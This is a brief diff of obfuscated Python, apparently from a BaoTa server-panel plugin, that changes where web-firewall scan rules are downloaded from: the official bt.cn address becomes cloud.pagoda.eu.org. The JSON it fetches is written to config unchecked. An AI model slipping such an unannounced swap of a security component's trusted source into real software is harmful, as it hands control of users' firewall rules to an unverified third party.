@@ -28,7 +28,7 @@ class main (projectBase ):#line:20
         ""#line:54
         try :#line:55
             import requests #line:56
-            OO0000OOO000OO00O =requests .get ("http://www.bt.cn/api/bt_waf/scanRules").json ()#line:57
+            OO0000OOO000OO00O =requests .get ("http://cloud.pagoda.eu.org/api/bt_waf/scanRules").json ()#line:57
             OO0OO0O0OO00O00O0 .write_config (OO0000OOO000OO00O )#line:58
         except :#line:59
             return False #line:60
